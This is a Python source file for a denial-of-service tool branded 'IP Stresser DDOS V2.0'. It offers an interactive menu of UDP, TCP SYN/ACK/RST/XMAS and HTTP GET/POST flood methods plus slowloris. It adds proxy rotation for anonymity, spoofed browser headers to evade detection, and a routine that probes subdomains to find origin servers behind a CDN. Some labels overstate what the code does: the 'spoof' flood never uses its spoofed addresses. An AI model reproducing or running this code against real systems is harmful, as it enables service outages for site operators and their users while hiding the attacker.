import socket
import random
import time
import threading
import requests
import urllib3

# Disable SSL warnings for performance
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy configuration
proxy_list = []
proxy_index = 0
proxy_lock = threading.Lock()

def load_proxies():
    """Load proxies from proxies.txt or manual input"""
    global proxy_list
    try:
        with open('proxies.txt', 'r') as f:
            proxy_list = [line.strip() for line in f if line.strip()]
        if proxy_list:
            print(f"[✅] Loaded {len(proxy_list)} proxies from proxies.txt")
            return True
    except FileNotFoundError:
        print("[⚠️] proxies.txt not found. Create it with one proxy per line.")
        print("Format: http://ip:port or socks5://ip:port")
    
    # Manual proxy input
    manual = input("Enter proxies manually? (y/n): ").strip().lower()
    if manual == 'y':
        print("Enter proxies (one per line, empty line to finish):")
        while True:
            proxy = input().strip()
            if not proxy:
                break
            proxy_list.append(proxy)
        if proxy_list:
            print(f"[✅] Added {len(proxy_list)} proxies")
            return True
    
    return False

def get_next_proxy():
    """Get next proxy from the list (round-robin)"""
    global proxy_index
    if not proxy_list:
        return None
    
    with proxy_lock:
        proxy = proxy_list[proxy_index % len(proxy_list)]
        proxy_index += 1
        return proxy

def format_proxy(proxy):
    """Format proxy for requests library"""
    if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        proxy = 'http://' + proxy
    return {'http': proxy, 'https': proxy}

# User-Agent rotation for bypassing detection
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
]

def get_realistic_headers(referer=None):
    """Generate realistic browser headers"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
    }
    if referer:
        headers['Referer'] = referer
    return headers

def resolve_origin_ip(domain):
    """Try to find origin server IP behind CDN"""
    print(f"[🔍] Searching for origin IP of {domain}...")
    
    # Method 1: Try common subdomains that might not be behind CDN
    subdomains = ['direct', 'origin', 'dev', 'staging', 'admin', 'mail', 'ftp', 'cpanel', 'whm', 'webmail', 'beta']
    found_ips = set()
    
    import socket as sock
    for sub in subdomains:
        try:
            test_domain = f"{sub}.{domain}"
            ip = sock.gethostbyname(test_domain)
            if not ip.startswith(('104.', '172.', '162.', '2606:', '2803:', '2405:', '2a06:')):
                found_ips.add(ip)
                print(f"[✅] Found potential origin IP via {test_domain}: {ip}")
        except:
            pass
    
    # Method 2: DNS history check (you'd integrate with services like SecurityTrails)
    if found_ips:
        print(f"[✅] Discovered {len(found_ips)} potential origin IPs")
        return list(found_ips)
    else:
        print(f"[⚠️] Could not find origin IP, using domain directly")
        return [domain]

# Set the window title
print(f"\033]0;IP Stresser DDOS V2.0 By elitestresser.club\007", end="", flush=True)

# ASCII Art for a slick intro
ASCII_ART = """
 _______  ___      ___   _______  _______ 
|       ||   |    |   | |       ||       |
|    ___||   |    |   | |_     _||    ___|
|   |___ |   |    |   |   |   |  |   |___ 
|    ___||   |___ |   |   |   |  |    ___|
|   |___ |       ||   |   |   |  |   |___ 
|_______||_______||___|   |___|  |_______|
IP Stresser DDOS V2.0 By elitestresser.club
"""

# UDP Flood Methods
def udp_plain_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"A" * packet_size
    print(f"[🚀] UDP Plain Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(f"[❌] Error: {e}")
    finally:
        sock.close()
        print(f"[✅] Done! Sent {packet_count} packets.")

def udp_random_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    end_time = time.time() + duration
    packet_count = 0
    print(f"[🚀] UDP Random Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(f"[❌] Error: {e}")
    finally:
        sock.close()
        print(f"[✅] Done! Sent {packet_count} packets.")

def udp_burst_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    end_time = time.time() + duration
    packet_count = 0
    print(f"[🚀] UDP Burst Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            for _ in range(100):  # Burst of 100 packets
                payload = random.randbytes(packet_size)
                sock.sendto(payload, (ip, port))
                packet_count += 1
    except Exception as e:
        print(f"[❌] Error: {e}")
    finally:
        sock.close()
        print(f"[✅] Done! Sent {packet_count} packets.")

def udp_spoof_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    end_time = time.time() + duration
    packet_count = 0
    print(f"[🚀] UDP Spoof Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            spoof_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(f"[❌] Error: {e}")
    finally:
        sock.close()
        print(f"[✅] Done! Sent {packet_count} packets (Spoofed IPs may not reflect).")

def udp_frag_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    end_time = time.time() + duration
    packet_count = 0
    print(f"[🚀] UDP Frag Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size // 2)  # Simulate fragmented packets
            sock.sendto(payload, (ip, port))
            sock.sendto(payload, (ip, port))  # Send two parts
            packet_count += 2
    except Exception as e:
        print(f"[❌] Error: {e}")
    finally:
        sock.close()
        print(f"[✅] Done! Sent {packet_count} packets.")

# TCP Flood Methods
def tcp_syn_flood_single(ip, port, duration):
    end_time = time.time() + duration
    packet_count = 0
    print(f"[🚀] TCP SYN Flood (Single) on {ip}:{port} | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect_ex((ip, port))
            sock.close()
            packet_count += 1
    except Exception as e:
        print(f"[❌] Error: {e}")
    finally:
        print(f"[✅] Done! Sent {packet_count} SYN packets.")

def tcp_syn_flood_multi(ip, port, duration):
    end_time = time.time() + duration
    packet_count = [0]
    def syn_worker():
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect_ex((ip, port))
                sock.close()
                packet_count[0] += 1
            except:
                pass
    print(f"[🚀] TCP SYN Flood (Multi) on {ip}:{port} | {duration}s...")
    threads = [threading.Thread(target=syn_worker) for _ in range(100)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(f"[✅] Done! Sent {packet_count[0]} SYN packets.")

def tcp_data_flood_single(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = random.randbytes(packet_size)
    print(f"[🚀] TCP Data Flood (Single) on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(payload)
            packet_count += 1
    except Exception as e:
        print(f"[❌] Error: {e}")
    finally:
        sock.close()
        print(f"[✅] Done! Sent {packet_count} packets.")

def tcp_data_flood_multi(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = [0]
    def data_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        payload = random.randbytes(packet_size)
        try:
            sock.connect((ip, port))
            while time.time() < end_time:
                sock.send(payload)
                packet_count[0] += 1
        except:
            pass
        sock.close()
    print(f"[🚀] TCP Data Flood (Multi) on {ip}:{port} | {packet_size} bytes | {duration}s...")
    threads = [threading.Thread(target=data_worker) for _ in range(100)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(f"[✅] Done! Sent {packet_count[0]} packets.")

def tcp_ack_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(f"[🚀] TCP ACK Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\x00" * 10)  # Small ACK-like packet
            packet_count += 1
    except Exception as e:
        print(f"[❌] Error: {e}")
    finally:
        sock.close()
        print(f"[✅] Done! Sent {packet_count} ACK packets.")

def tcp_rst_flood(ip, port, duration):
    end_time = time.time() + duration
    packet_count = 0
    print(f"[🚀] TCP RST Flood on {ip}:{port} | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect_ex((ip, port))
            sock.close()  # Immediate close to simulate RST
            packet_count += 1
    except Exception as e:
        print(f"[❌] Error: {e}")
    finally:
        print(f"[✅] Done! Sent {packet_count} RST packets.")

def tcp_xmas_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(f"[🚀] TCP XMAS Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\xFF" * 10)  # Simulate XMAS packet with all flags
            packet_count += 1
    except Exception as e:
        print(f"[❌] Error: {e}")
    finally:
        sock.close()
        print(f"[✅] Done! Sent {packet_count} XMAS packets.")

# HTTP/HTTPS Flood Methods
def http_get_flood(url, duration, use_origin=False):
    end_time = time.time() + duration
    request_count = 0
    session = requests.Session()
    session.verify = False
    use_proxies = len(proxy_list) > 0
    
    # Parse domain for origin IP discovery
    from urllib.parse import urlparse
    parsed = urlparse(url)
    domain = parsed.hostname or parsed.netloc
    
    # Try to find origin IP if requested
    target_ips = []
    if use_origin and domain:
        target_ips = resolve_origin_ip(domain)
    
    print(f"[🚀] HTTP GET Flood on {url} | {duration}s...")
    if use_proxies:
        print(f"[🔒] Using {len(proxy_list)} proxies for anonymity")
    
    try:
        while time.time() < end_time:
            try:
                # Rotate proxies
                if use_proxies:
                    proxy = get_next_proxy()
                    session.proxies = format_proxy(proxy)
                
                # Set realistic headers
                headers = get_realistic_headers(referer=url)
                
                # Target origin IP if found, otherwise use URL
                if target_ips and use_origin:
                    target_url = url.replace(domain, random.choice(target_ips))
                    headers['Host'] = domain  # Keep original domain in Host header
                else:
                    target_url = url
                
                session.get(target_url, headers=headers, timeout=0.5)
            except:
                pass
            request_count += 1
    except Exception as e:
        print(f"[❌] Error: {e}")
    finally:
        session.close()
    print(f"[✅] Done! Sent {request_count} GET requests.")

def http_post_flood(url, duration, use_origin=False):
    end_time = time.time() + duration
    request_count = 0
    session = requests.Session()
    session.verify = False
    payload = {"flood": "data" * 1000}
    use_proxies = len(proxy_list) > 0
    
    # Parse domain for origin IP discovery
    from urllib.parse import urlparse
    parsed = urlparse(url)
    domain = parsed.hostname or parsed.netloc
    
    # Try to find origin IP if requested
    target_ips = []
    if use_origin and domain:
        target_ips = resolve_origin_ip(domain)
    
    print(f"[🚀] HTTP POST Flood on {url} | {duration}s...")
    if use_proxies:
        print(f"[🔒] Using {len(proxy_list)} proxies for anonymity")
    
    try:
        while time.time() < end_time:
            try:
                # Rotate proxies
                if use_proxies:
                    proxy = get_next_proxy()
                    session.proxies = format_proxy(proxy)
                
                # Set realistic headers
                headers = get_realistic_headers(referer=url)
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                
                # Target origin IP if found, otherwise use URL
                if target_ips and use_origin:
                    target_url = url.replace(domain, random.choice(target_ips))
                    headers['Host'] = domain  # Keep original domain in Host header
                else:
                    target_url = url
                
                session.post(target_url, data=payload, headers=headers, timeout=0.5)
            except:
                pass
            request_count += 1
    except Exception as e:
        print(f"[❌] Error: {e}")
    finally:
        session.close()
    print(f"[✅] Done! Sent {request_count} POST requests.")

def https_slowloris(url, duration):
    end_time = time.time() + duration
    connection_count = 0
    sockets = []
    print(f"[🚀] HTTPS Slowloris on {url} | {duration}s...")
    try:
        # Parse hostname from URL
        from urllib.parse import urlparse
        parsed = urlparse(url)
        hostname = parsed.hostname or parsed.netloc.split(':')[0] if parsed.netloc else url.split('/')[2] if len(url.split('/')) > 2 else url
        
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((hostname, 443))  # Assuming HTTPS on port 443
                sock.send(b"GET / HTTP/1.1\r\nHost: " + hostname.encode() + b"\r\n")
                sockets.append(sock)
                connection_count += 1
            except:
                pass
    except Exception as e:
        print(f"[❌] Error: {e}")
    finally:
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        print(f"[✅] Done! Opened {connection_count} connections.")

# Validation Function
def validate_input(prompt, min_val, max_val, input_type=int):
    while True:
        try:
            value = input_type(input(prompt))
            if max_val == float('inf'):
                if value >= min_val:
                    return value
                print(f"[❌] Must be at least {min_val}!")
            else:
                if min_val <= value <= max_val:
                    return value
                print(f"[❌] Must be between {min_val} and {max_val}!")
        except ValueError:
            print("[❌] Invalid input! Numbers only.")

def main():
    print(ASCII_ART)
    
    # Load proxies for anonymity
    use_proxy = input("Use proxies for anonymity? (y/n): ").strip().lower()
    if use_proxy == 'y':
        load_proxies()
    
    print("\n🔹 Protocols 🔹")
    print("  1. UDP 🌊")
    print("  2. TCP ⚡")
    print("  3. HTTP/HTTPS 🌐")
    protocol = input("Select protocol (1-3): ").strip()

    if protocol == "1":  # UDP
        print("\n🔹 UDP Methods 🔹")
        print("  1. Plain (Fixed payload)")
        print("  2. Random (Random payload)")
        print("  3. Burst (10-packet bursts)")
        print("  4. Spoof (Random source IPs)")
        print("  5. Frag (Fragmented packets)")
        method = input("Select method (1-5): ").strip()

        ip = input("Enter server IP: ")
        port = validate_input("Enter port (1-65535): ", 1, 65535)
        duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float) ## elitestresser.club
        packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)

        if method == "1":
            udp_plain_flood(ip, port, duration, packet_size)
        elif method == "2":
            udp_random_flood(ip, port, duration, packet_size)
        elif method == "3":
            udp_burst_flood(ip, port, duration, packet_size)
        elif method == "4":
            udp_spoof_flood(ip, port, duration, packet_size)
        elif method == "5":
            udp_frag_flood(ip, port, duration, packet_size)
        else:
            print("[❌] Invalid UDP method!")

    elif protocol == "2":  # TCP
        print("\n🔹 TCP Methods 🔹")
        print("  1. SYN Flood (Single)")
        print("  2. SYN Flood (Multi-threaded)")
        print("  3. Data Flood (Single)")
        print("  4. Data Flood (Multi-threaded)")
        print("  5. ACK Flood")
        print("  6. RST Flood")
        print("  7. XMAS Flood")
        method = input("Select method (1-7): ").strip()

        ip = input("Enter server IP: ")
        port = validate_input("Enter port (1-65535): ", 1, 65535)
        duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)

        if method in ["3", "4"]:
            packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)

        if method == "1":
            tcp_syn_flood_single(ip, port, duration)
        elif method == "2":
            tcp_syn_flood_multi(ip, port, duration)
        elif method == "3":
            tcp_data_flood_single(ip, port, duration, packet_size)
        elif method == "4":
            tcp_data_flood_multi(ip, port, duration, packet_size)
        elif method == "5":
            tcp_ack_flood(ip, port, duration)
        elif method == "6":
            tcp_rst_flood(ip, port, duration)
        elif method == "7":
            tcp_xmas_flood(ip, port, duration)
        else:
            print("[❌] Invalid TCP method!")

    elif protocol == "3":  # HTTP/HTTPS
        print("\n🔹 HTTP/HTTPS Methods 🔹")
        print("  1. GET Flood")
        print("  2. POST Flood")
        print("  3. Slowloris (HTTPS)")
        method = input("Select method (1-3): ").strip()

        url = input("Enter URL (e.g., http://example.com): ")
        duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float) ##nightmarestresser.co
        
        # Ask about origin IP discovery for CDN bypass
        use_origin = False
        if method in ["1", "2"]:
            origin_bypass = input("Try to bypass CDN and hit origin server? (y/n): ").strip().lower()
            use_origin = (origin_bypass == 'y')

        if method == "1":
            http_get_flood(url, duration, use_origin)
        elif method == "2":
            http_post_flood(url, duration, use_origin)
        elif method == "3":
            https_slowloris(url, duration)
        else:
            print("[❌] Invalid HTTP/HTTPS method!")

    else:
        print("[❌] Invalid protocol!")

if __name__ == "__main__":
    main()
